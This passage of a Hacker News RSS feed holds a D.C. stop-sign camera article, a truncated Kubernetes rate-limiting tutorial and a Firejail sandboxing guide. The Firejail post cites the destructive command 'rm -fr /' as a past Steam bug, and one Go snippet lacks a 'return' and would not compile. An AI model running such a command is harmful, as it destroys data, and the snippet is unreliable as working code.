      <li><a target="_blank" href="https://blog.kissmetrics.com/epiphanies-needed-to-grasp-statistical-significance/">Statistical Significant Testing</a> <b> [External: Kissmetrics]</b></li>
      <li><a href="https://www.jackkinsella.ie/articles/email-marketing">Email Marketing</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/introduction-to-paid-advertising">Introduction to Paid Advertising</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/building-an-advertising-ready-web-application">Building an Advertising Ready Web Application (and other preparations for advertising)</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/staying-organised-when-advertising">Staying Organised When Advertising</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/a-tour-of-targeting">A Tour of Targeting</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/ad-creative-writing-basics">Basics of Writing Ad Creatives</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/strategic-principles-in-paid-advertising">Strategic Principles in Paid Advertising</a> </li>
      <li><a href="https://www.jackkinsella.ie/articles/optimising-and-debugging-paid-advertisements">Optimising and Debugging Paid Advertisements</a> </li>
    </ul>
  </div>
</div>

      </div></div>]]>
            </description>
            <link>https://www.jackkinsella.ie/books/entreprenerd/marketing_for_programmers</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133340</guid>
            <pubDate>Sun, 14 Feb 2021 15:52:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A ‚ÄúPredatory‚Äù Stop-Sign Camera Is Terrorizing My Neighborhood]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 17 (<a href="https://news.ycombinator.com/item?id=26133260">thread link</a>) | @LordAtlas
<br/>
February 14, 2021 | https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/ | <a href="https://web.archive.org/web/*/https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico"><p>Traffic cameras can cross the thin line in law enforcement between keeping citizens safe and fucking them over.&nbsp;</p><p>Full disclosure: I‚Äôm counting myself among the fucked over. In late August, I was notified by the photo enforcement wing of the D.C. Department of Motor Vehicles that I‚Äôd been issued four tickets for ‚Äúpassing‚Äù the same stop sign on four different occasions. Two of the tickets were written on the same day. A stop-sign camera, the lowest-form of traffic cam yet unleashed, got me. The fines totaled $400.</p><figure><img src="https://lh6.googleusercontent.com/IE1N-0rH7w9HBLp1zQWpNnnz0sPCmuNqvuT_JFyAfV41OvUmGHNi9NCKCMTmtIrLndixSJW4-YhU4CHUjBp_whpIuN7wbF0mcNjJ7j8S_dNULTHCQIlOCa-rMD_LKzmbl8I-8iNq" alt=""></figure><p>I try to obey parking and traffic laws. Obsessively even. Not because I‚Äôm cautious or a good citizen. Because I‚Äôm cheap as hell! And I know from experience that D.C. ticket writers will nail you every time you give them a reason to, and lots of times even when you don‚Äôt. Anybody who‚Äôs lived here for any time or even visited much can affirm.</p><p>The last time I wrote a story about the city‚Äôs hyperaggressive ticketing strategies was in the early 1990s. At the time, violent crime was so out of hand here that the place was known as America‚Äôs Murder Capital. But local government‚Äôs most obvious crime-fighting efforts came in the parking realm. D.C. was making so much money off parking violations that officials were actually putting on seminars for leaders from various states and even foreign governments on how to increase revenues through ticket writing. I lived in the very dense Mount Pleasant neighborhood back then and legal parking was hard as hell to find. But even if you found a spot you weren‚Äôt safe. I‚Äôd sometimes spend 15 minutes driving around before landing a spot without a ‚ÄúNo Parking‚Äù sign in play and no painted curb or fire hydrant nearby or any sort of hint at all that this space was off-limits, only to return to my car an hour later to find a pink slip underneath the windshield wiper bogusly saying I‚Äôd violated the two-hour maximum time limit, or finding handwriting on the ticket saying my vehicle was ‚Äúless than 40 feet‚Äù from an intersection or driveway or whatever the ticket writer needed to help meet his or her quota and slap me with a $25-and-up fine. I remember coming out of my apartment one morning and seeing a posse from the Metropolitan Police Department (MPD) walking down the main drag, Mount Pleasant Street, and leaving a ticket on just about every windshield. I asked an officer what was happening and was told that they‚Äôd been ordered by their commander to enforce a law requiring all parked cars to have their wheels turned toward the curb. (Who knew such a law existed?)&nbsp;</p><p>The city made contesting a ticket an all-day affair in which you‚Äôd lose in the end anyway. Your car would get ‚Äú<a href="https://dpw.dc.gov/service/booting-and-impoundment" target="_blank" rel="noreferrer noopener">booted</a>‚Äù and towed by the city if you amassed more than three unpaid parking tickets or total fines above $200, and you couldn‚Äôt register a car or get a vehicle inspection or renew a drivers license in the city without settling your DMV bill. I pretty much always had more than three outstanding tickets, and the penalties doubled after a month, so I often owed the city more in fines than my beater Toyota was even worth. I worked hard trying to beat the system. I stayed on the road by registering my car at my mom‚Äôs address in suburban Virginia, and using that same address for my driver‚Äôs license. I was constantly going to the Virginia DMV and paying a $25 fee to get new license plates that wouldn‚Äôt be on D.C.‚Äôs boot/tow list, which surely had my old tag numbers on it. I knew at the time that my fight wasn‚Äôt exactly righteous. But, well, the city wasn‚Äôt exactly observing Marquess of Queensberry Rules with me either.</p><p>The car wars ended when my jalopy got stolen. Losing the car, even by theft, actually came as a relief. I didn‚Äôt own another vehicle until I left Mount Pleasant in 2002 for the Petworth neighborhood and all its street parking.&nbsp;</p><p>I hadn‚Äôt really thought of the ticketing horrors from my past since the move. But the four stop-sign violations at the same intersection‚Äîat $100 a pop!‚Äîbrought all the bad memories back. The city‚Äôs letter to me telling me about the tickets said there was video of my offenses online. I was able to access only one of the four clips. It was indeed my car in the shot, and it showed that as I approached the four-way stop I slowed down to almost zero miles an hour, but hell if I ever came to a dead stop. The old California stop. By the letter of the law, I was a violator. Dammit.</p><p>But this massive punishment still felt off. I‚Äôve been living about 200 yards from that <a href="https://www.google.com/maps/place/Kansas+Ave+NW+%26+Buchanan+St+NW,+Washington,+DC+20011/@38.946233,-77.0248877,17z/data=!3m1!4b1!4m5!3m4!1s0x89b7c86d4e139bf7:0x7b586b15117de56f!8m2!3d38.946233!4d-77.022699" target="_blank" rel="noreferrer noopener">four-way-stop intersection</a> for 19 years now, and have known about that stop-sign camera for a huge chunk of that time. But I‚Äôd never gotten a single ticket from it. I‚Äôd never even heard of anybody else in the neighborhood getting nabbed. But here I get four in one load of mail. </p><p>So I started looking into the camera that nailed me. Turns out it holds a special place in the shitty history of traffic enforcement. The <a href="https://cluballiance.aaa.com/public-affairs/press-release/?rdl=hartford.aaa.com&amp;Id=8b025de6-9f63-41a4-9541-f223b66c30c9" target="_blank" rel="noreferrer noopener">American Automobile Association</a> described D.C. as the first major city to use photo enforcement for stop-sign violations. And the stop-sign cam in my neighborhood, installed in 2013, was <a href="https://wtop.com/news/2013/08/dc-tests-first-stop-sign-camera/" target="_blank" rel="noreferrer noopener">the first ever in D.C.</a> I found a segment from NBC‚Äôs <a href="https://www.youtube.com/watch?v=5i4cgoxxeIs&amp;ab_channel=DefendYourLiberty" target="_blank" rel="noreferrer noopener"><em>The Today Show</em></a> on the introduction of stop-sign cameras that had NBC reporter Tom Costello doing his stand-up from the same intersection where seven years later I‚Äôd get nabbed. Costello boasted about all the safety benefits the new technology would bring, while Cathy Lanier, chief of the Metropolitan Police Department at the time, told the morning show audience that the cameras were set up because ‚Äúour community has asked us to enforce the law.‚Äù&nbsp;</p><p>‚ÄúNow we‚Äôll be able to do it with less manpower and safer for police officers,‚Äù said Lanier (who left the city a few years after bringing in the cameras to join the NFL as senior vice president in charge of security).&nbsp;&nbsp;</p><figure><img loading="lazy" width="3024" height="1716" src="https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?w=1024" alt="stop sign" srcset="https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg 3024w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=300,170 300w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=768,436 768w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=1024,581 1024w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=1536,872 1536w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=2048,1162 2048w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=1080,613 1080w, https://admin.defector.com/wp-content/uploads/sites/28/2021/02/Image-from-iOS-1.jpg?resize=85,48 85w" sizes="(max-width: 3024px) 100vw, 3024px"><figcaption>Photo by Dave McKenna</figcaption></figure><p>I also found a neighborhood message board with several live threads about the stop-sign camera, full of posts from angry locals who‚Äôd been recently nailed at the same intersection. The more I read, the easier I felt I‚Äôd got off: Others told of getting double-digit tickets, meaning they were facing a four-figure fine. Somebody posted a short video of the camera snapping photos of a car that stopped dead at the intersection.</p><p>This particular stop-sign camera‚Äôs fortunes, however, may well have turned when it flashed at Deepak Gopalakrishna.&nbsp;</p><p>Gopalakrishna happens to be a transportation engineer with a specialty in road safety. He‚Äôs lived in Petworth for years and told me he hadn‚Äôt ever gotten a ticket on Kansas Avenue NW until this summer. He started asking around and found that just about everybody else on his block had also gotten multiple $100 fines. He said his professional background and personal leanings have had him support pro-bike, ‚Äúnot car-friendly‚Äù programs like the <a href="https://visionzeronetwork.org/" target="_blank" rel="noreferrer noopener">Vision Zero</a> project. And he said he has no fixed bias against speed cameras and red light cameras. But the rate at which he‚Äôd been nailed told him that this stop-sign camera had to go.</p><p>‚ÄúI‚Äôve got five tickets,‚Äù Gopalakrishna told me. ‚ÄúBefore I found out about the first one, I‚Äôd gotten four more.‚Äù</p><p>Gopalakrishna FOIA‚Äôd for information on the equipment being used by the city for its stop-sign camera setup and just how many tickets had been issued at that one intersection. He learned that the stop-sign cam‚Äôs sensor in Petworth, a <a href="https://www.smartmicro.com/fileadmin/media/Downloads/Traffic_Radar/Sensor_Data_Sheets__24_GHz_/UMRR_Traffic_Sensor_Type_44_Data_Sheet.pdf" target="_blank" rel="noreferrer noopener">Smartmicro UMrr-11 Type 44 Radar Antenna</a>, had been recalibrated on June 5, 2020. A ticket boom commenced soon after.</p><p>Data from MPD shows that in June 2020, the camera in question snapped 82 violators. Then there were 2,850 tickets in July 2020 (compared to 231 tickets in July 2019). Then the camera started flashing like paparazzi in Cannes: From August through November, a total of 17,216 tickets were issued. That‚Äôs $1,721,600 from one camera at one intersection in just four months.&nbsp;</p><p>Again, I learned years ago that D.C. had a black belt in ticket writing. But today‚Äôs stats floor even me. <a href="https://dccouncil.us/wp-content/uploads/2020/01/dmv20.pdf" target="_blank" rel="noreferrer noopener">D.C. DMV</a> documents show that the city issued 2,869,810 traffic and parking tickets in fiscal year 2019, with fines totaling $375,916,124. That averages out over the year to more than four tickets and about $543 in fines for every man, woman and child living in the city, including those who don‚Äôt drive. (Comprehensive ticket revenues for 2020, which would include the Petworth stop-sign camera windfall, are not yet available.) This is a town with oodles of tourism and, pre-pandemic, teeming with commuters, so visitors paid lots of penalties. But the cam located smack in the middle of my residential neighborhood penalized D.C. residents far more than outsiders.&nbsp; </p><p>According to Gopalakrishna, there‚Äôs no obvious quality-of-life benefit to the citizenry for all the pain folks who live near a stop-sign cam must suffer.</p><p>‚ÄúI want to be very clear: Being against this camera isn‚Äôt being against safety. This isn‚Äôt a safety matter,‚Äù he said. ‚ÄúThis isn‚Äôt like a red-light camera or a speed camera. There‚Äôs no safety study, no data saying, ‚ÄòWow, these stop-sign cameras really have had an impact on safety!‚Äô There‚Äôs nothing. I can point to a lot of things that have worked and are known to work: rumble strips, certain lighting on that stop sign, for example. Take those steps, and you‚Äôll get more people stopping, and you can talk about safety. But, those things don‚Äôt bring in revenue for the city. This camera does. And once you remove the safety component, it‚Äôs just targeting. Targeting one neighborhood.‚Äù</p><p>Gopalakrishna said he‚Äôs been unable to get answers on what exactly took place when the stop-sign camera was recalibrated in June. The user manual for the <a href="https://www.smartmicro.com/fileadmin/media/Downloads/Traffic_Radar/Sensor_Data_Sheets__24_GHz_/UMRR_Traffic_Sensor_Type_44_Data_Sheet.pdf" target="_blank" rel="noreferrer noopener">Smartmicro UMrr-11 Type 44 Radar Antenna</a>, describes its utility only in speed camera and red light enforcement applications. There is no mention anywhere in the document of its use in a stop-sign camera setup.</p><p>‚ÄúIt‚Äôs frustrating because there‚Äôs no legal definition of what a full-stop is,‚Äù he said. ‚ÄúIt‚Äôs all so arbitrary. So basically, this private company gets to decide what a complete stop is, and they set the camera ‚Ä¶</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/">https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/</a></em></p>]]>
            </description>
            <link>https://defector.com/a-predatory-stop-sign-camera-is-terrorizing-my-neighborhood/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133260</guid>
            <pubDate>Sun, 14 Feb 2021 15:42:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rate Limiting in controller-runtime and client-go]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26133148">thread link</a>) | @hasheddan
<br/>
February 14, 2021 | https://danielmangum.com/posts/controller-runtime-client-go-rate-limiting/ | <a href="https://web.archive.org/web/*/https://danielmangum.com/posts/controller-runtime-client-go-rate-limiting/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section>
  <article>
    <header>
      
      <h2>February 14, 2021</h2>
      

      
    </header>

    <p>If you have written a <a href="https://kubernetes.io/docs/concepts/architecture/controller/">Kubernetes
controller</a>, you
are likely <a href="https://github.com/kubernetes-sigs/controller-runtime">familiar with
<code>controller-runtime</code></a>,
or <a href="https://github.com/kubernetes/client-go">at least <code>client-go</code></a>.
<code>controller-runtime</code> is a framework for building controllers that allows
consumers to setup multiple controllers that are all handled under a controller
manager. Behind the the scenes, <code>controller-runtime</code> is using <code>client-go</code> to
communicate with the Kubernetes <a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/">API
server</a>
to watch for changes on resources and pass them along to the relevant
controllers. It handles a number of aspects of plumbing up these controllers,
including caching, queuing, and more. One of these components is <em>rate
limiting</em>.</p>
<h2 id="what-is-rate-limiting">What is rate limiting?</h2>
<blockquote>
<p>This section is a very basic overview of rate limiting. You may skip it if you
are already well versed in the concepts, but it may be useful for framing
later sections.</p>
</blockquote>
<p>Rate limiting has existed in software since computer networking was invented,
and before that in many other human processes. In fact, as we discuss rate
limiting, you‚Äôll likely see many parallels to daily tasks you perform and
organizational patterns within companies and communities.</p>
<p>Rate limiting is necessary for effective communication to occur between any two
parties. Software communicates by passing messages between different processes
of execution, whether it be via the operating system, dedicated hardware
facilities, across a network, or some combination of the three. In a
client-server model, the client is typically requesting that the server perform
some work on its behalf. It takes time for the server to perform that work,
meaning that if many clients ask it to do work at the same time and the server
does not have the capacity to handle them all, it has a choice to make. It can:</p>
<ol>
<li>Drop requests with no response.</li>
<li>Wait to respond to requests until the work can be performed to completion.</li>
<li>Respond to requests indicating that the work cannot be performed at this
time, but that the client should ask again at a future time.</li>
<li>Add the work to a queue and respond to the request to with a message saying
that it will let the client know when it completes the work.</li>
</ol>
<p>If the client and server know each other well (i.e. their communication patterns
are well-known to each other), any of these methods could be valid communication
models. Think about your relationships with other people in your life. You may
know people who communicate in a wide variety of manners, but you likely can
work effectively with all of them if the communication style is well-known.</p>
<blockquote>
<p>As an example, my partner plans things ahead and doesn‚Äôt like unexpected
changes. My college roommate, on the other hand, does not like planning and
prefers to make decisions at the last moment. I may prefer one communcation
style to the other, but I know each of them quite well and can live
effectively with either because we can each adjust our communication patterns
appropriately.</p>
</blockquote>
<p>Unfortunately, like humans, software can be unreliable. For example, a server
may say that it will respond to requests with a future time at which the client
should ask again for work to be performed, but the connection between the client
and the server could be blocked, causing requests to be dropped. Likewise, a
client could be receiving responses saying that work cannot be performed until a
future time, but it may continue requesting for the work to be done immediately.
For these reasons (and many more that we will not explore today), both
server-side and client-side rate limiting are necessary for scalable, resilient
systems.</p>
<p>Because <code>controller-runtime</code> and <code>client-go</code> are frameworks to build Kubernetes
controllers, which are <em>clients</em> of the Kubernetes API server, we will mostly be
focusing on client-side rate limiting today.</p>
<h2 id="whats-in-a-controller">What‚Äôs in a controller?</h2>
<blockquote>
<p>Skip this section if you are already familiar with the basics of how
<code>controller-runtime</code> works.</p>
</blockquote>
<p><code>controller-runtime</code> exposes the <a href="https://github.com/kubernetes-sigs/controller-runtime/blob/e1a725df2743147795e5dfc8275365f7ada24805/pkg/controller/controller.go#L61">controller
abstraction</a>
to consumers primarily through the execution of a <a href="https://book.kubebuilder.io/cronjob-tutorial/controller-implementation.html#implementing-a-controller">reconciliation
loop</a>
that is implemented by the consumer and passed to the framework. Here is an
example of a simple
<a href="https://github.com/kubernetes-sigs/controller-runtime/blob/e1a725df2743147795e5dfc8275365f7ada24805/pkg/reconcile/reconcile.go#L89"><code>Reconciler</code></a>
that could be passed to a <code>controller-runtime</code> controller:</p>
<div><pre><code data-lang="go"><span>type</span> Reconciler <span>struct</span> {}

<span>func</span> (r *Reconciler) Reconcile(ctx context.Context, req reconcile.Request) (reconcile.Result, <span>error</span>) {
    fmt.Println(<span>"Reconciling something!"</span>)
    <span>return</span> reconcile.Result{}, <span>nil</span>
}
</code></pre></div><blockquote>
<p>You can see a more sophisticated reconciliation loop
<a href="https://github.com/crossplane/crossplane/blob/5f239dbb7c399a8d544518be2be23ad16f98a71d/internal/controller/pkg/manager/reconciler.go#L216">here</a>.</p>
</blockquote>
<p><code>controller-runtime</code> accepts this reconciliation loop via a controller <a href="https://en.wikipedia.org/wiki/Builder_pattern">builder
pattern</a> implementation that
allows a consumer to specify resources that should trigger this reconciliation
to run. Here is an example of a controller that would be triggered by any CRUD
operations on a <code>Pod</code>:</p>
<div><pre><code data-lang="go">ctrl.NewControllerManagedBy(mgr).
    Named(<span>"my-pod-controller"</span>).
    For(&amp;v1.Pod{}).
    Complete(&amp;Reconciler{})
</code></pre></div><p>Ignoring the controller manager (<code>mgr</code>) for a moment, you can see that we are
passing a name for the controller (<code>my-pod-controller</code>), the type we want it to
reconcile (<code>v1.Pod</code>), as well the <code>&amp;Reconciler{}</code> that will actually perform,
well, the reconciliation. There are other options that we will explore later
(and some that we will not) that can be passed into this controller builder to
further customize its behavior.</p>
<p>Every <code>Reconciler</code> is required to implement the <code>Reconcile(ctx context.Context, req reconcile.Request) (reconcile.Result, error)</code> method. <code>controller-runtime</code>
will invoke this method when changes to ‚Äúwatched‚Äù objects occur. Information
about the object that triggered the reconciliation (in this case a <code>Pod</code>) is
passed via the
<a href="https://github.com/kubernetes-sigs/controller-runtime/blob/e1a725df2743147795e5dfc8275365f7ada24805/pkg/reconcile/reconcile.go#L47"><code>reconcile.Request</code></a>.
Within the reconciliation loop, the consumer may choose to use that information
to get the object from the API server using <code>client-go</code> or the
<a href="https://github.com/kubernetes-sigs/controller-runtime/blob/e1a725df2743147795e5dfc8275365f7ada24805/pkg/client/interfaces.go#L100"><code>Client</code></a>
abstraction exposed by <code>controller-runtime</code>. Let‚Äôs expand our <code>Reconciler</code> a bit
more:</p>
<div><pre><code data-lang="go"><span>type</span> Reconciler <span>struct</span> {
    client client.Client
}

<span>func</span> (r *Reconciler) Reconcile(ctx context.Context, req reconcile.Request) (reconcile.Result, <span>error</span>) {
    p := &amp;v1.Pod{}
    <span>if</span> err := r.client.Get(ctx, req.NamespacedName, p); err != <span>nil</span> {
        reconcile.Result{}, err
    }
    fmt.Println(p.Name)
    <span>return</span> reconcile.Result{}, <span>nil</span>
}
</code></pre></div><p>Now we use the
<a href="https://github.com/kubernetes/apimachinery/blob/c93b0f84892eb6bcbc80b312ae70729d8168bc7e/pkg/types/namespacedname.go#L27"><code>NamespacedName</code></a>
to get the object that triggered the reconciliation. We may fail to get the
object from the API server, in which case we return <code>err</code>. Otherwise, we will
return <code>nil</code>.</p>
<blockquote>
<p>Note: when saying that we are making a request to the API server, it doesn‚Äôt
necessarily mean we are literally making a network call. As mentioned earlier,
<code>controller-runtime</code> employs
<a href="https://github.com/kubernetes-sigs/controller-runtime/blob/e1a725df2743147795e5dfc8275365f7ada24805/pkg/cache/cache.go#L41">caching</a>
to make the operations of controllers managed by a controller manager more
efficient. We will not go into depth on how caching is performed, but if
enough people find this post useful I‚Äôll write one up on that as well.</p>
</blockquote>
<p>This is as far as we will go with implementing our tiny controller because we
have reached a place where we might encounter rate limiting, and we have
probably already lost half the readers who already know how to implement a
Kubernetes controller and think this is just another tutorial on doing so. If
you want to learn more about controller design, take a look at one of the
resources below or search on YouTube for one of the countless talks that have
been given on the topic.</p>
<ul>
<li><a href="https://book.kubebuilder.io/cronjob-tutorial/cronjob-tutorial.html">Kubebuilder CronJob
Tutorial</a>
<ul>
<li>The canonical ‚Äúbuild your first controller‚Äù tutorial.</li>
</ul>
</li>
<li><a href="https://engineering.bitnami.com/articles/a-deep-dive-into-kubernetes-controllers.html">‚ÄúA deep dive into Kubernetes controllers‚Äù - Bitnami
Blog</a>
<ul>
<li>An old but good post that goes a bit beyond ‚Äúpass this thing to
<code>controller-runtime</code> and let the magic ensue!".</li>
</ul>
</li>
<li><a href="https://youtu.be/4ceaeaLYaPs">Building an Enterprise Infrastructure Control Plane on
Kubernetes</a>
<ul>
<li>A tutorial from KubeCon NA 2020 I gave with <a href="https://twitter.com/stevendborrelli">Steven
Borrelli</a> (Mastercard) on building
<a href="https://crossplane.io/">Crossplane</a> providers. We go through building
controllers for a GitHub operator and talk about the various things
happening behind the scenes. We also <a href="https://github.com/crossplane/crossplane-runtime">describe
<code>crossplane-runtime</code></a>,
a framework built on top of <code>controller-runtime</code> that caters to writing
controllers for external infrastructure providers.</li>
</ul>
</li>
<li><a href="https://youtu.be/slX2nAFHeK0">TGI Kubernetes 145: Duck Typing in Kubernetes</a>
<ul>
<li>This is a recent livestream by <a href="https://twitter.com/n3wscott">Scott
Nichols</a> where he talks about some advanced
controller patterns used in projects like <a href="https://knative.dev/">Knative</a>,
Crossplane, and more. Scott is also leading some <a href="https://docs.google.com/document/d/1Bud636dMcAQjXe6xfOMBzT0YYqOj1rx3EELxrq2YQv8/edit?usp=sharing">upstream
standardization</a>
in this area.</li>
</ul>
</li>
</ul>
<h2 id="what-happens-when-we-fail">What happens when we fail?</h2>
<p>This is not an existential question, we are just talking about when we return an
error from our reconciliation loop. Like most things in software, and in life,
the answer is: ‚Äúit depends‚Äù. Let‚Äôs take a look at the <a href="https://github.com/kubernetes-sigs/controller-runtime/blob/e1a725df2743147795e5dfc8275365f7ada24805/pkg/reconcile/reconcile.go#L27"><code>reconcile.Result</code>
struct</a>
and see what options we have for telling <code>controller-runtime</code> what to do next.</p>
<div><pre><code data-lang="go"><span>// Result contains the result of a Reconciler invocation.
</span><span></span><span>type</span> Result <span>struct</span> {
  <span>// Requeue tells the Controller to requeue the reconcile key.  Defaults to false.
</span><span></span>  Requeue <span>bool</span>

  <span>// RequeueAfter if greater than 0, tells the Controller to requeue the reconcile key after the Duration.
</span><span></span>  <span>// Implies that Requeue is true, there is no need to set Requeue to true at the same time as RequeueAfter.
</span><span></span>  RequeueAfter time.Duration
}
</code></pre></div><p>So we can either say requeue after some period of time, requeue immediately, or
don‚Äôt requeue at all. Then there is also the <code>error</code> we return. The permutations
of these values, and how <code>controller-runtime</code> will respond to them are outlined
below (you can also look directly at the
<a href="https://github.com/kubernetes-sigs/controller-runtime/blob/16bf3ad036b908d897543c415fcc0bafc5cec711/pkg/internal/controller/controller.go#L297">source</a>).</p>
<table>
<thead>
<tr>
<th>Requeue</th>
<th>RequeueAfter</th>
<th>Error</th>
<th>Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>any</td>
<td>any</td>
<td>!nil</td>
<td>Requeue with rate limiting.</td>
</tr>
<tr>
<td>true</td>
<td>0</td>
<td>nil</td>
<td>Requeue with rate limiting.</td>
</tr>
<tr>
<td>any</td>
<td>&gt;0</td>
<td>nil</td>
<td>Requeue after specified <code>RequeueAfter</code>.</td>
</tr>
<tr>
<td>false</td>
<td>0</td>
<td>nil</td>
<td>Do not requeue.</td>
</tr>
</tbody>
</table>
<p>We are primarily interested in the first two cases as the latter two are fairly
self explanatory. Both of the first two essentially result in the same outcome
(with some difference in what logs and metrics are written). The specific call
being made is <code>c.Queue.AddRateLimited(req)</code>. This is similar to the
<code>RequeueAfter</code> result except in that case the call is <code>c.Queue.AddAfter(req, result.RequeueAfter)</code> and we are passing the exact time to wait until the
request is added back to queue. So how long do we wait in the rate limited case?</p>
<h2 id="the-default-controller-rate-limiter">T‚Ä¶</h2></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danielmangum.com/posts/controller-runtime-client-go-rate-limiting/">https://danielmangum.com/posts/controller-runtime-client-go-rate-limiting/</a></em></p>]]>
            </description>
            <link>https://danielmangum.com/posts/controller-runtime-client-go-rate-limiting/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133148</guid>
            <pubDate>Sun, 14 Feb 2021 15:29:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Firejail on Linux to sandbox all the things]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26133079">thread link</a>) | @zdw
<br/>
February 14, 2021 | https://dataswamp.org/~solene/2021-02-14-linux-firejail.html | <a href="https://web.archive.org/web/*/https://dataswamp.org/~solene/2021-02-14-linux-firejail.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article id="20210214">
  <header>
  
    
    <p>Written by <em>Sol√®ne</em>, on 14 February 2021.<br>Tags: 
<span><a href="https://dataswamp.org/~solene/tag-linux.html">#linux</a></span>


<span><a href="https://dataswamp.org/~solene/tag-security.html">#security</a></span>


<span><a href="https://dataswamp.org/~solene/tag-sandbox.html">#sandbox</a></span>

</p>
    
  </header>
  <h2> Introduction</h2>
<p>Firejail is a program that can prepare sandboxes to run other programs.  This is an efficient way to keep a software isolated from the rest of the system without need of changing its source code, it works for network, graphical or daemons programs.
</p>
<p>You may want to sandbox programs you run in order to protect your system for any issue that could happen within the program (security breach, code mistake, unknown errors), like Steam once had a "rm -fr /" issue, using a sandbox that would have partially saved a part of the user directory.  Web browsers are major tools nowadays and yet they have access to the whole system and have many security issues discovered and exploited in the wild, running it in a sandbox can reduce the data a hacker could exfiltrate from the computer.  Of course, sandboxing comes with an usability tradeoff because if you only allow access to the ~/Downloads/ directory, you need to put files in this directory if you want to upload them, and you can only download files into this directory and then move them later where you really want to keep your files.
</p>
<h2> Installation</h2>
<p>On most Linux systems you will find a Firejail package that you can install.  If your distribution doesn't provide a Firejail package, it seems the installing from sources process is quite easy, and as the project is written in C with limited dependencies it may be easy to get the build process done.
</p>
<p>There are no service to enable and no kernel parameters to add.  Apparmor or SELinux features in kernel can be used to integrates into Firejail profiles if you want to.
</p>
<h2> Usage</h2>
<h3> Start a program</h3>
<p>The simplest usage is to run a command by adding Firejail before the command name.
</p>
<pre><code>$ Firejail firefox
</code></pre>
<h3> Use a symlink</h3>
<p>Firejail has a neat feature to allow starting software by their name without calling Firejail explicitly, if you create a symbolic link in your $PATH using a program name but targeting Firejail, when you call that name Firejail will automatically now what you want to start.  The following example will run firefox when you call the symbolic link.
</p>
<pre><code>export PATH=~/bin/:$PATH
$ ln -s /usr/bin/firejail ~/bin/firefox
$ firefox
</code></pre>
<h3> Listing sandboxes</h3>
<p>There is a Firejail --list command that will tell you about all sandboxes running and what are their parameters.  As a first column the identifier is available for more Firejail features.
</p>
<pre><code>$ firejail --list
6108:solene::/usr/bin/firejail /usr/bin/firefox 
</code></pre>
<h3> Limit bandwidth per program</h3>
<p>Firejail also has a neat feature that allows to limit the bandwidth available only for one sandbox environment.  Reusing previous list output, I will reduce firefox bandwidth, the number are in kB/s.
</p>
<pre><code>$ firejail --bandwidth=6108 set wlan0 1000 40
</code></pre>
<p>You can find more information about this feature in the "TRAFFIC SHAPING" section of the Firejail man page.
</p>
<h3> Restrict network access</h3>
<p>If for some reason you want to start a program with absolutely no network access, you can run a program and deny it any network.
</p>
<pre><code>$ firejail --net=none libreoffice
</code></pre>
<h2> Conclusion</h2>
<p>Firejail is a neat way to start software into sandboxes without requiring any particular setup.  It may be more limited and maybe less reliable than OpenBSD programs who received unveil() features but it's a nice trade off between safety and required work within source code (literally none).  It is a very interesting project that proves to work easily on any Linux system, with a simple C source code with little dependencies.  I am not really familiar with Linux kernel and its features but Firejail seems to use seccomp-bpf and namespace, I guess they are complicated to use but powerful and Firejail comes here as a wrapper to automate all of this.
</p>
<p>Firejail has been proven to be USABLE and RELIABLE for me while my attempts at sandboxing Firefox with AppArmor were tedious and not optimal.  I really recommend it.
</p>
<h2> More resources</h2>
<p><a href="https://firejail.wordpress.com/">Official project website with releases and security information</a></p>
<p><a href="https://github.com/netblue30/firejail">Firejail sources and documentation</a></p>
<p><a href="https://github.com/chiraag-nataraj/firejail-profiles">Community profiles 1</a></p>
<p><a href="https://github.com/nyancat18/fe">Community profiles 2</a></p>

</article>
</div></div>]]>
            </description>
            <link>https://dataswamp.org/~solene/2021-02-14-linux-firejail.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26133079</guid>
            <pubDate>Sun, 14 Feb 2021 15:21:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Z3, the Word Problem, and Path Homotopy as Equality]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26132818">thread link</a>) | @philzook
<br/>
